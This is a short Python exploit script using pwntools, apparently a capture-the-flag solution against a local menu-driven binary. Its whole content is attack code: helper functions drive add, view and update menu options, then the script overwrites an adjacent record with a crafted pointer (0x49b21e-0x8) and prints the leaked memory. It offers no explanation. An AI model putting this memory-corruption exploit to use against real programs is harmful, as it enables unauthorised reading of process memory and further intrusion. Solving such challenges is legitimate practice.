#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './main')
libc = ELF(exe.libc.path) if exe.libc else None

def add(age, name):
  io.sendlineafter(b": ", b"1")
  io.sendlineafter(b": ", str(age).encode())
  io.sendlineafter(b": ", name)

def view(idx, choice):
  io.sendlineafter(b": ", b"2")
  io.sendlineafter(b": ", str(idx).encode())
  io.sendlineafter(b": ", str(choice).encode())
  io.recvuntil(b" is ")
  return io.recvline().strip()

def update(idx, choice, data):
  io.sendlineafter(b": ", b"3")
  io.sendlineafter(b": ", str(idx).encode())
  io.sendlineafter(b": ", str(choice).encode())
  io.sendlineafter(b": ", data)

io = process()

for i in range(10): add(12, b"A"*8)
update(1, 2, p64(0) + p64(0x49b21e-0x8))
update(0, 2, b"B"*24)
log.success(view(2, 2).decode())
